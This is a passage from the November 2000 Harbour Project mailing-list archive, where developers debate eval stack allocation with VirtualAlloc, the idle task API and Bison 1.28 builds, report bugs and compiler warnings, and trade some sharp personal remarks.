From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Fri Nov 24 21:24:02 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random gpfs)
References: <LOBBKAFMMFGJIKLMEPAKMEHGDHAA.ron@profit-master.com>
Message-ID: <018401c05686$ea9c92b0$0a0ac8c8@VECWS1>

Ron,

> Win32 has VirtualAlloc( LPVOID lpAddress, SIZE_T dwSize, DWORD
> flAllocationType, DWORD flProtect )
> 
> It does allow reserve and then commit.
> 
> This is probably the simplest, fastest way to keep our Dynamic Stack without
> changing any logic.
> 
> It is available in OS/2 and Win32, any one care to check *X?

Have you read by any chance the concerns about DOS/handheld 
and multiplatformness in general ?

Victor Szakats



From harbour@lists.harbour-project.org  Fri Nov 24 22:10:03 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Fri Nov 24 22:10:03 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <017001c05686$c84a1ac0$0a0ac8c8@VECWS1>
Message-ID: <LOBBKAFMMFGJIKLMEPAKOEHHDHAA.ron@profit-master.com>

Victor,

> Ron,
>
>
> >    * include/hbset.h
> >    * include/set.ch
> >    * source/pp/pptable.c
> >      + Added _SET_IDLEREPEAT = 101
> >    * source/rtl/set.c
> >      + Added support for SET( _SET_IDLEREPEAT ) - Default is .T.
>
> I think it's a bad idea to move this setting to the SETs, since
> this breaks
> the modularity of Harbour idle system for the sake of a very
> minor feature.
> This way it also pollutes PP namespace.

"this breaks the modularity of Harbour idle system" - Can you please
explain?

> This solution also falls far from the suggestions. (per task
> setting passed to
> HB_IDLEADD()).

This is now compatible with all past code, as per your concern, and still
allows non repeating support for those interested.

You are welcome to implement the per task support with HB_IDLEADD(). I never
stated any objection to this idea.

> You didn't answer to my question for any possible uses for a
> non-repeating
> idle task.

Any app level cleanup, that does *not* require to be run again, until
further app code have been executed. GC is a great example (though not app
level).

> > /* I suggest we add HB_IDLEALL() and rename HB_IDLESTATE() to
> HB_IDLESTEP()
> > */
>
> Why ?

HB_IDLESTATE() only executes a single GC/Idle Block per invocation.
Developer might want to guarantee all Idle Tasks have been executed.

Example 1:

   FOR Counter := 1 TO 1000

      MyProcess()

      HB_IDLESTEP() // More descriptive name.

   NEXT

Example 2:

   LengthyProcess1()

   HB_IDLEALL() // Guarantee all Idle Tasks executed.

   LengthyProcess2()

Ron


From harbour@lists.harbour-project.org  Fri Nov 24 22:14:01 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Fri Nov 24 22:14:01 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random gpfs)
In-Reply-To: <018401c05686$ea9c92b0$0a0ac8c8@VECWS1>
Message-ID: <LOBBKAFMMFGJIKLMEPAKCEHIDHAA.ron@profit-master.com>

Victor,

> Ron,
>
> > Win32 has VirtualAlloc( LPVOID lpAddress, SIZE_T dwSize, DWORD
> > flAllocationType, DWORD flProtect )
> >
> > It does allow reserve and then commit.
> >
> > This is probably the simplest, fastest way to keep our Dynamic
> Stack without
> > changing any logic.
> >
> > It is available in OS/2 and Win32, any one care to check *X?
>
> Have you read by any chance the concerns about DOS/handheld
> and multiplatformness in general ?

Yes, and I did respond too! Did you read my response? Here it is again for
your convenience:

// ---------- //
> As said several times, the fact that DOS support has some problems,
> doesn't mean that we should severe the situation by adding _new_
> problems,
> or we could ignore the 16bit platform.

I agree 100%!!!

Though, this proposal will not add any *new* problem to DOS. It will simply
mean that Harbour will not be able to offer "infinitely" growing Dynamic
Stack in DOS.

This will not change anything because DOS doesn't have the "infinite" memory
pool to begin with.

It will simply mean that a reasonable Stack Size will be used in DOS.

Ron
// ---------- //

Ron


From harbour@lists.harbour-project.org  Fri Nov 24 22:29:02 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Fri Nov 24 22:29:02 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKOEHHDHAA.ron@profit-master.com>
Message-ID: <019a01c05690$0c2b0840$0a0ac8c8@VECWS1>

> "this breaks the modularity of Harbour idle system" - Can you please
> explain?

The idle handling was quite simple and self-contained (modular) in just one 
file, now it's mixed in the mainstream (central) Harbour SET table. 
Extending the SET table should be done only when absolutely necessary.

> You are welcome to implement the per task support with HB_IDLEADD(). I never
> stated any objection to this idea.

I'm not interested in such thing, since it can be easily solved without the 
help of the Harbour core. (simple INKEY() wrapper)

> > You didn't answer to my question for any possible uses for a
> > non-repeating
> > idle task.
> 
> Any app level cleanup, that does *not* require to be run again, until
> further app code have been executed. GC is a great example (though not app
> level).

I know it's purpose, but you still haven't told any real world example (app level).

> > > /* I suggest we add HB_IDLEALL() and rename HB_IDLESTATE() to
> > HB_IDLESTEP()
> > > */
> >
> > Why ?
> 
> HB_IDLESTATE() only executes a single GC/Idle Block per invocation.
> Developer might want to guarantee all Idle Tasks have been executed.

Has something changed then ? since in my few days old repository I 
can read this:

/* performs all tasks defined for idle state */
void hb_idleState( void )
(HB_IDLESTATE() just calls hb_idleState())

The purpose of HB_IDLESTATE() is to "simulate" an idle situation 
explicitly, thus it should behave the same way as the implicit idle state.

Victor Szakats



From harbour@lists.harbour-project.org  Fri Nov 24 22:33:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Fri Nov 24 22:33:02 2000
Subject: [Harbour] VC++ harbour need bison 1.28 (or at last greater than 1.25)
In-Reply-To: <002b01c05675$7b6bd240$0100007f@sl.conex.net>
Message-ID: <LOBBKAFMMFGJIKLMEPAKAEHJDHAA.ron@profit-master.com>

Luiz, Patrick,

I am using Bison 1.28
(ftp://ftp.simtel.net/pub/simtelnet/gnu/djgpp/v2gnu/bsn128b.zip) with BCC55
without any problems.

Luiz, you may want to verify the following:

1. bison.exe installed into djgpp\bin
2. bison.hai and bison.sim installed into djgpp\share
3. You have an environment variable DJGPP pointing to djgpp\djgpp.env like
SET DJGPP=\DJGPP\DJGPP.ENV
4. You should comment out or delete the [BISON] section from djgpp\djgpp.env
5. You should no longer have a SET BISON_SIMPLE=...

Please note that in 1.28 bison.sim is not called bison.simple

I would recommend the above even if you don't have djgpp installed.

Hope this helps.

Ron

> Patrick
>
> > JF,
> >
> > Can you send version 1.28 to me so I can upate the Web Page.
>
> I´ve already tested bison 1.28 with Bcc 5.5. harbour.exe don´t
> work is bison
> 1.28 is used
>
> Regards
>
> Luiz Rafael Culik


From harbour@lists.harbour-project.org  Fri Nov 24 22:34:03 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Fri Nov 24 22:34:03 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random gpfs)
References: <LOBBKAFMMFGJIKLMEPAKCEHIDHAA.ron@profit-master.com>
Message-ID: <01a001c05690$af2ee7a0$0a0ac8c8@VECWS1>

> Though, this proposal will not add any *new* problem to DOS. It will simply
> mean that Harbour will not be able to offer "infinitely" growing Dynamic
> Stack in DOS.

Call it a problem or not, we'll end up having and maintaining several (but at least two) 
different stack mechanism: one for DOS (and others), and one (or more) for 
specific OS APIs.

You haven't answered my concern about making the Harbour core platform 
dependent.

My overall impression is that stack handling is not that kind of thing which 
we should solve with OS API dependent tools. It should be done 
programatically, this is more work on the start, but it's a much longer term 
solution.

Victor Szakats



From harbour@lists.harbour-project.org  Fri Nov 24 22:49:01 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Fri Nov 24 22:49:01 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <019a01c05690$0c2b0840$0a0ac8c8@VECWS1>
Message-ID: <LOBBKAFMMFGJIKLMEPAKMEHJDHAA.ron@profit-master.com>

Victor,

> > "this breaks the modularity of Harbour idle system" - Can you please
> > explain?
>
> The idle handling was quite simple and self-contained (modular)
> in just one
> file, now it's mixed in the mainstream (central) Harbour SET table.
> Extending the SET table should be done only when absolutely necessary.

If every one else agrees with your assessment (I don't), I'll add an
HB_IDLESETREPEAT() and will remove the SET() support.

> > > You didn't answer to my question for any possible uses for a
> > > non-repeating
> > > idle task.
> >
> > Any app level cleanup, that does *not* require to be run again, until
> > further app code have been executed. GC is a great example
> (though not app
> > level).
>
> I know it's purpose, but you still haven't told any real world
> example (app level).

What is not clear by App Clean-Up? For instance checking for the existence
of temporary files, and removal of them. Obviously things of that nature
need not be run again until the app executed code beyond the current wait
state.

> > > > /* I suggest we add HB_IDLEALL() and rename HB_IDLESTATE() to
> > > HB_IDLESTEP()
> > > > */
> > >
> > > Why ?
> >
> > HB_IDLESTATE() only executes a single GC/Idle Block per invocation.
> > Developer might want to guarantee all Idle Tasks have been executed.
>
> Has something changed then ? since in my few days old repository I
> can read this:
>
> /* performs all tasks defined for idle state */
> void hb_idleState( void )
> (HB_IDLESTATE() just calls hb_idleState())
>
> The purpose of HB_IDLESTATE() is to "simulate" an idle situation
> explicitly, thus it should behave the same way as the implicit idle state.

hb_idleState() performs only 1 step at a time, while being called repeatedly
by the inkey loop. It was that way before I made my changes.

Ron


From harbour@lists.harbour-project.org  Fri Nov 24 23:04:01 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Fri Nov 24 23:04:01 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random gpfs)
In-Reply-To: <01a001c05690$af2ee7a0$0a0ac8c8@VECWS1>
Message-ID: <LOBBKAFMMFGJIKLMEPAKCEHKDHAA.ron@profit-master.com>

Victor,

> > Though, this proposal will not add any *new* problem to DOS. It
> will simply
> > mean that Harbour will not be able to offer "infinitely" growing Dynamic
> > Stack in DOS.
>
> Call it a problem or not, we'll end up having and maintaining
> several (but at least two)
> different stack mechanism: one for DOS (and others), and one (or
> more) for
> specific OS APIs.

I can't begin to understand your claims, but I am not going to start another
one of those threads.

1. Let's keep it simple, Maurilio, asked a question, I answered.

2. No, I don't think that Maurilio's proposal will introduce new problems to
Harbour DOS, nor do I agree that this will force multiple implementation of
the stack, or will force the Harbour core to be [more] platform dependant.

3. I don't believe in reinventing the wheel, especially, not under sever
time constraints. I want to see 1.0 ASAP. I am not in favor of
re-implementing such critical piece (unless un-avoidable) before we release
1.0.

4. You don't have time to develop, but have lots of time for this kind of
threads. I OTOH have no time for these arguments because I need to leave
time for development, so Ron out...

Ron


From harbour@lists.harbour-project.org  Sat Nov 25 00:11:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Sat Nov 25 00:11:02 2000
Subject: [Harbour] This Snippet Is Compilable In Clipper
In-Reply-To: <482569A1.002D766B.00@smtp.aon-asia.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKIEHKDHAA.ron@profit-master.com>

Andi,

Fixed. This was a parser issue not PP.

Ron

> request qout
> 
> function main()
> 
> &("qout")("qout()")
> 
> return nil
> 
> But won't compile under Harbour. PP master ?


From harbour@lists.harbour-project.org  Sat Nov 25 00:11:34 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Sat Nov 25 00:11:34 2000
Subject: [Harbour] 2000-11-24 21:10 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <482569A1.002D766B.00@smtp.aon-asia.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKMEHKDHAA.ron@profit-master.com>

2000-11-24 21:10 UTC+0800 Ron Pinkas <ron@profit-master.com>
   * source/compiler/harbour.y
   * source/compiler/harbour.sly
     + Added support for MacroExpr as FunCall

From harbour@lists.harbour-project.org  Sat Nov 25 01:50:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Sat Nov 25 01:50:02 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random gpfs)
References: <LOBBKAFMMFGJIKLMEPAKMEHGDHAA.ron@profit-master.com>
Message-ID: <3A1F6105.C9547864@libero.it>

Thanks Ron,

I'm wondering when (and whether) do you sleep? :-))

I think linux has similar api (someone with good linux experience
here?).

And it will create no problems to DOS or handheld devices where stack
will be only one block (like it is now with clipper) and where you'll
get an error if you use more than this.

That said, I will not start coding this way (note, this would be the
fastest and _surely working_ solution for our problem) until after we
all agree to follow this route.

Thanks again.

Ron Pinkas ha scritto:
> 
> Maurilio,
> 
> Win32 has VirtualAlloc( LPVOID lpAddress, SIZE_T dwSize, DWORD
> flAllocationType, DWORD flProtect )
> 
> It does allow reserve and then commit.
> 
> This is probably the simplest, fastest way to keep our Dynamic Stack without
> changing any logic.
> 
> It is available in OS/2 and Win32, any one care to check *X?
> 
> Ron
> 
> > Ryszard,
> >
> > I think we should investigate memory allocation and commitment under
> > win32 (linux and OS/2 are surely ok and I can't belive that there isn't
> > something similar under win32 as well).
> >
> > Sadly I don't know win32 api, so I'll have to go to micro$oft site and
> > start wandering.
> >
> > This way we would have a single stack object (and single symbols
> > "container" as well).
> >
> > regards.
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 

 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Sat Nov 25 03:04:01 2000
From: harbour@lists.harbour-project.org (=?big5?B?ufml1g==?=)
Date: Sat Nov 25 03:04:01 2000
Subject: [Harbour] Browse function bug!!
References: <3A1D8FA7.28147.15B5B4CA@localhost>
Message-ID: <000a01c056b2$f6566b40$6b7ba8c0@ssprg>

This is a multi-part message in MIME format.

------=_NextPart_000_0007_01C056F6.041E1DC0
Content-Type: text/plain;
	charset="big5"
Content-Transfer-Encoding: 7bit

I have one .dbf and one deleted mark,
It's occur error when I run browse...

------=_NextPart_000_0007_01C056F6.041E1DC0
Content-Type: application/octet-stream;
	name="TEST.PRG"
Content-Transfer-Encoding: quoted-printable
Content-Disposition: attachment;
	filename="TEST.PRG"

//
Func    Main()
Local   aData   :=3D {},;
        nAt     :=3D 00,;
        nI      :=3D 00,;
        cVar    :=3D Space(03)

        SET DELETE ON
        USE "TEST" NEW

        Do While .T.

           //
           TEST->( dbGoTop())
           TEST->( Browse())

           Scroll()
           @ 10, 00 Say "Please Input S/O:";
                    Get cVar
           Read

           If Lastkey() =3D=3D 27
              Exit
           EndIf

           TEST->( dbGoTop())

           Do While ! TEST->( Eof())
              nAt :=3D aScan( aData, {|_x|_x[1] =3D=3D TEST->SN .And.;
                                        _x[2] =3D=3D cVar })
              If Empty( nAt )
                 AADD( aData, { TEST->SN, cVar, 00 })
                 nAt :=3D Len( aData )
              EndIf
              aData[ nAt, 3 ] +=3D TEST->GW
              TEST->( dbSkip())
           EndDo

           // =BCg=A4J
           TEST->( dbGoTop())
           For nI :=3D 01 To Len( aData )
               If TEST->( Eof())
                  TEST->( dbAppend())
               EndIf
               TEST->SN :=3D aData[nI, 01]
               TEST->SO :=3D aData[nI, 02]
               TEST->GW :=3D aData[nI, 03]
               TEST->( dbSkip())
           Next nI

           // =A7R=B0=A3=A6h=BEl=B5=A7=BC=C6
           Do While ! TEST->( Eof())
              TEST->( dbDelete())
              TEST->( dbSkip())
           EndDo

           //
           TEST->( dbGoTop())
           TEST->( Browse())

           Exit

        EndDo


------=_NextPart_000_0007_01C056F6.041E1DC0
Content-Type: application/octet-stream;
	name="TEST.DBF"
Content-Transfer-Encoding: base64
Content-Disposition: attachment;
	filename="TEST.DBF"

A2QLGQMAAACCAAoAAAAAAAAAAAAAAAAAAAAAAAAAAABTTgBOAABGMgNMBUMwiyaLAwAfHwAAUF0F
AAUAdJIwi1NPAE4AAEYyA0wFQzCLJosDAB8fAABQXQUABQB0kjCLR1cATgAARjIDTAVOMIsmiwMA
Hx8AAFBdBQAFAHSSMIsNACAxMTE5OTkgMzAgMjIyOTk5IDMwKjIyMjAwNSAzMBo=

------=_NextPart_000_0007_01C056F6.041E1DC0--



From harbour@lists.harbour-project.org  Sat Nov 25 04:40:04 2000
From: harbour@lists.harbour-project.org (JF Lefebvre)
Date: Sat Nov 25 04:40:04 2000
Subject: [Harbour] VC++ harbour need bison 1.28 (or at last greater than 1.25)
In-Reply-To: <002b01c05675$7b6bd240$0100007f@sl.conex.net>
Message-ID: <202011250924.0AP9ODA17572@localhost.localdomain>

Luiz, Patrick

I will do a full test with either BC55 and VC++ and will keep you 
informed of the result.

In the meantime, we could have the two version on the download 
page of the site with a warning about 1.28...

> 
> 
> > JF,
> >
> > Can you send version 1.28 to me so I can upate the Web Page.
> 
> I=B4ve already tested bison 1.28 with Bcc 5.5. harbour.exe don=B4t work =
is
> bison 1.28 is used
> 
> Regards
> 
> Luiz Rafael Culik
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
> 
> 



Best regards,

J. Lefebvre,
Bruxelles,
Belgium


From harbour@lists.harbour-project.org  Sat Nov 25 05:16:01 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Sat Nov 25 05:16:01 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random gpfs)
References: <LOBBKAFMMFGJIKLMEPAKCEHKDHAA.ron@profit-master.com>
Message-ID: <01dc01c056c8$f0726290$0a0ac8c8@VECWS1>

> 2. No, I don't think that Maurilio's proposal will introduce new problems to
> Harbour DOS, nor do I agree that this will force multiple implementation of
> the stack, or will force the Harbour core to be [more] platform dependant.

Political blabla. Technical nonsense.

> 3. I don't believe in reinventing the wheel, especially, not under sever
> time constraints. I want to see 1.0 ASAP. I am not in favor of
> re-implementing such critical piece (unless un-avoidable) before we release
> 1.0.

What severe time constraints ? You again have a deadline ? 
Could you inform the list ? Change "I" to "we" and rethink this.

> 4. You don't have time to develop, but have lots of time for this kind of

Check yourself.

> threads. I OTOH have no time for these arguments because I need to leave
> time for development, so Ron out...

You never have time for technical arguments, you're the "rope and glue" man.

Victor Szakats



From harbour@lists.harbour-project.org  Sat Nov 25 06:40:03 2000
From: harbour@lists.harbour-project.org (Patrick Mast, Harbour)
Date: Sat Nov 25 06:40:03 2000
Subject: [Harbour] Mailing list info on the Harbour page (Patrick)
In-Reply-To: <011301c04e20$e4278890$0a0ac8c8@VECWS1>
Message-ID: <NCBBJKNMIDPJNLJCHCHICEILFJAA.harbour@winfakt.com>

Victor and all,

> The "Mailing List" page of the Harbour homepage 
> is still pointing to the abandoned egroups lists.
Fixed!
Bison version 1.28b is also online now.

http://www.Harbour-Project.org

regards,

Patrick Mast
www.Patrick.Be.kz

From harbour@lists.harbour-project.org  Sat Nov 25 07:07:02 2000
From: harbour@lists.harbour-project.org (=?big5?B?ufml1g==?=)
Date: Sat Nov 25 07:07:02 2000
Subject: [Harbour] about Box ASCII code bug!!
References: <NCBBJKNMIDPJNLJCHCHICEILFJAA.harbour@winfakt.com>
Message-ID: <000a01c056d7$a80f3460$6b7ba8c0@ssprg>

Hello all!!

The file include\hbapigt.h line: 83, 84, 85, 86 may be modify to:

#define HB_B_SINGLE_V          0xb3 // '?
#define HB_B_SINGLE_H          0xc4 // '?
#define HB_B_DOUBLE_V          0xb3 // '?
#define HB_B_DOUBLE_H          0xc4 // '?

Because these code will occur error when compiler at my environment.
We are from TAIWAN, We are use double bytes code.....




From harbour@lists.harbour-project.org  Sat Nov 25 07:53:02 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Sat Nov 25 07:53:02 2000
Subject: Odp: [Harbour] getting old CVS snapshots
Message-ID: <200011250751_MC2-BC1B-579@compuserve.com>

Marek,

Sorry - what I meant was: I'd like to try some.  But first I'd like to
try some more to get the current CVS to build with VC++.  Please keep
those ZIPs. <g>

---later---

Looks like Jean or someone fixed things: Harbour builds with VC++
again. :-)

Jean: I still get the OOP errors (BASE/1004) as before.

John.

From harbour@lists.harbour-project.org  Sat Nov 25 08:20:04 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Sat Nov 25 08:20:04 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
Message-ID: <200011250818_MC2-BC1B-614@compuserve.com>

Victor & others,

Please can you stop talking about "idle" tasks which are clearly
nothing of the sort!

If you want periodic, low-ish priority tasks (as it appears you do),
say so and let's implement them explicitly as that.

It would make more sense to have such things be guaranteed (or some
such) to run, rather than the somewhat ugly kludge needed with Clipper.

Maybe the pcode could run such a task once every N function calls,
message sends, loops, or some such.  The exact details need some
thought, but let's do it right.

John.

From harbour@lists.harbour-project.org  Sat Nov 25 08:20:32 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Sat Nov 25 08:20:32 2000
Subject: [Harbour] Alaska's site
Message-ID: <200011250818_MC2-BC1B-616@compuserve.com>

Al,

Hi!  Nice surprise to see you here!

I wish I could ever find time to hang out on your site...

John.

From harbour@lists.harbour-project.org  Sat Nov 25 08:21:25 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Sat Nov 25 08:21:25 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random
 gpfs)
Message-ID: <200011250818_MC2-BC1B-612@compuserve.com>

Victor,

Ron> Win32 has VirtualAlloc( ...

"Have you read by any chance the concerns about DOS/handheld =

and multiplatformness in general ?"

What relevance has that?  Such systems will use a single, fairly
small, stack.

John.

From harbour@lists.harbour-project.org  Sat Nov 25 08:22:18 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Sat Nov 25 08:22:18 2000
Subject: [Harbour] VC++ harbour need bison 1.28 (or at last greater
 than 1.25)
Message-ID: <200011250818_MC2-BC1B-617@compuserve.com>

Jean (& Patrick),
 =

"I successfully used 1.28 (thankx John)."

Please note that I didn't necessarily send all of 1.28, since I do
not recall where I got the files I sent you!

If 1.28 is to be put on the Harbour site I think it needs to be the
full thing, in case it's more than I sent.

John.

From harbour@lists.harbour-project.org  Sat Nov 25 08:23:14 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Sat Nov 25 08:23:14 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random
 gpfs)
Message-ID: <200011250818_MC2-BC1B-615@compuserve.com>

Ron,

"Win32 has VirtualAlloc( ..."

Good point!  I've never used it, but it's been in long enough that it
probably works by now. :-)

"any one care to check *X?"

I should be able to in a few days from now.

OTOH, one can argue that (on an *X-type OS) it really ought to be OK
just to malloc() a vast chunk and do nothing special (i.e. just use
it).  The system should then commit "real" memory as needed, i.e.
probably not initially allocate any actual RAM, then when the app uses
the address range it should allocate pages as needed.  This has been
supported on most (all?) mainstream CPUs for many years - even the
386 can do it. :-)

Dave: any idea what Linux does (or prefers) in this area?  My system's
down for a (h/w) re-build and I was just short-shipped a CPU chip! :-(

John.

From harbour@lists.harbour-project.org  Sat Nov 25 09:11:03 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Sat Nov 25 09:11:03 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas  <ron@profit-master.com>
References: <200011250818_MC2-BC1B-614@compuserve.com>
Message-ID: <001501c056e9$cdc0fec0$0a0ac8c8@VECWS1>

Huh ?


> Victor & others,
> 
> Please can you stop talking about "idle" tasks which are clearly
> nothing of the sort!
> 
> If you want periodic, low-ish priority tasks (as it appears you do),
> say so and let's implement them explicitly as that.
> 
> It would make more sense to have such things be guaranteed (or some
> such) to run, rather than the somewhat ugly kludge needed with Clipper.
> 
> Maybe the pcode could run such a task once every N function calls,
> message sends, loops, or some such.  The exact details need some
> thought, but let's do it right.

Victor Szakats



From harbour@lists.harbour-project.org  Sat Nov 25 10:36:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Sat Nov 25 10:36:02 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random gpfs)
In-Reply-To: <01dc01c056c8$f0726290$0a0ac8c8@VECWS1>
Message-ID: <LOBBKAFMMFGJIKLMEPAKEEHNDHAA.ron@profit-master.com>

Victor,

> Political blabla. Technical nonsense.

I could care less what you think.

> What severe time constraints ? You again have a deadline ?
> Could you inform the list ? Change "I" to "we" and rethink this.

Obviously, none of my time constraints is any concern of yours, and thus
none of your business!

> You never have time for technical arguments, you're the "rope and
> glue" man.

When you have to code, code don't talk!

Ron

P.S. Please don't expect any further replies. If it is not clear enough for
you, let me make it clearer:

!!!I don't have time for your nonsense!!! Please find someone else to keep
you entertained!!!


From harbour@lists.harbour-project.org  Sat Nov 25 13:03:02 2000
From: harbour@lists.harbour-project.org (aacker)
Date: Sat Nov 25 13:03:02 2000
Subject: [Harbour] Alaska's site
References: <200011250818_MC2-BC1B-616@compuserve.com>
Message-ID: <00b701c05709$dc1af410$6601a8c0@c765036b>

Hi John,

   Good to see you here also!    Stop in when you get time....but don't
worry about it...Your work here is important to the project.... do what it
takes to make it happen!!!

Al

Al Acker,President,  Editor
Acker Consulting, Inc.
http://www.afaonline.com
The Xbase Files Magazine
http://www.thexbasefiles.com



From harbour@lists.harbour-project.org  Sat Nov 25 13:15:03 2000
From: harbour@lists.harbour-project.org (April)
Date: Sat Nov 25 13:15:03 2000
Subject: [Harbour] warnings while making... classes.c, rddcpy.c, dbcmd.c, dbfcdx1.c, hbpp.c
Message-ID: <3A1FFF39.BD0314B1@user.rose.com>

../../classes.c: In function `hb_clsInst':
../../classes.c:1250: warning: unused variable `wItemIndex'
../../classes.c:1249: warning: unused variable `wStackBase'
../../classes.c: In function `HB_FUN___OBJSENDMSG':
../../classes.c:1577: warning: unused variable `uiParam'
In file included from ../../dbcmd.c:3185:
../../rddcpy.c: In function `rddMoveRecords':
../../rddcpy.c:122: warning: unused variable `pEvalInfo'
../../rddcpy.c:116: warning: unused variable `szFileName'
../../dbcmd.c: At top level:
../../dbcmd.c:92: warning: `hb_waNull' defined but not used
../../dbfcdx1.c: In function `hb_cdxOrderCreate':
../../dbfcdx1.c:3239: warning: int format, long int arg (arg 2)
../../dbfcdx1.c:3241: warning: int format, long int arg (arg 2)
../../hbpp.c: In function `main':
../../hbpp.c:88: warning: unused variable `i'
../../hbpp.c:86: warning: unused variable `szDefText'





From harbour@lists.harbour-project.org  Sat Nov 25 13:15:30 2000
From: harbour@lists.harbour-project.org (April)
Date: Sat Nov 25 13:15:30 2000
Subject: [Harbour] trapping .prg errors
Message-ID: <3A20007D.6372E5A@user.rose.com>

While doing a full re-make, I saw a large block of warnings go by while
a .prg was being compiled (I think I made some statement as to
"unnecessary rules")

I re-make via:

@echo off
make -r clean
redir -e ..\results.err make -r
if not errorlevel 2 redir -ea ..\results.err make -r

but the output of the harbour errors did not go to the results.err file.

Should I set PRG_USR to /es2 so that the make system stops?  Or does
different values of /w[value] impact on this?



From harbour@lists.harbour-project.org  Sat Nov 25 13:27:02 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Sat Nov 25 13:27:02 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
Message-ID: <200011251325_MC2-BC13-A5D1@compuserve.com>

Victor,

"Huh ?"

In what sense do you mean that?  E.g. did you understand what I wrote?
If not, which part(s) didn't you understand?

Perhaps if you'd bothered to write rather more than "Huh ?" I wouldn't
be having to write this...

John.

From harbour@lists.harbour-project.org  Sat Nov 25 14:29:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Sat Nov 25 14:29:02 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas  <ron@profit-master.com>
In-Reply-To: <200011251325_MC2-BC13-A5D1@compuserve.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKCEHPDHAA.ron@profit-master.com>

John,

Don't let him drug you into his famous games.

He will do nothing more than drain your energy, and take, any and all time
you could have devoted for more productive tasks.

Same advise saved lots of my time.

Let's research the *x Virtual Allocation Services, and offer a working
solution to our Stack problem.

Ron

> Victor,
>
> "Huh ?"
>
> In what sense do you mean that?  E.g. did you understand what I wrote?
> If not, which part(s) didn't you understand?
>
> Perhaps if you'd bothered to write rather more than "Huh ?" I wouldn't
> be having to write this...
>
> John.


From harbour@lists.harbour-project.org  Sat Nov 25 14:39:01 2000
From: harbour@lists.harbour-project.org (Phil Barnett)
Date: Sat Nov 25 14:39:01 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas  <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKCEHPDHAA.ron@profit-master.com>
References: <200011251325_MC2-BC13-A5D1@compuserve.com>
Message-ID: <3A1FCECF.2573.7956C11@localhost>

On 25 Nov 2000, at 11:30, Ron Pinkas wrote:

> John,
> 
> Don't let him drug you into his famous games.
> 
> He will do nothing more than drain your energy, and take, any and all
> time you could have devoted for more productive tasks.
> 
> Same advise saved lots of my time.
> 
> Let's research the *x Virtual Allocation Services, and offer a working
> solution to our Stack problem.

The only problem I have with this is that you are now creating core 
dependencies that are OS specific. This is something that we have 
avoided so far.

Are you implying that we can't create a VM Block allocation 
scheme in ANSI C?

Sometime in the future, people will want to port Harbour to other 
platforms. The more work we do in ANSI C, the more likely this will 
happen. This is to give long life to Harbour, not to stop productivity 
this month. It's a long term benefit.

There is no deadline for Harbour. If you are creating one in your 
mind, then it is your deadline, not ours.

I understand the desire to 'finish' version 1.0 of Harbour. There's 
nothing I'd like better, but I don't want to do it at the cost of future 
portability issues. We agreed long ago that the core of Harbour 
Project would be written in ANSI C. I propose we continue down 
this road.


-- 
              Phil Barnett  mailto:midnight@the-oasis.net
                       WWW  http://www.the-oasis.net/
                  FTP Site  ftp://ftp.the-oasis.net

From harbour@lists.harbour-project.org  Sat Nov 25 15:15:03 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Sat Nov 25 15:15:03 2000
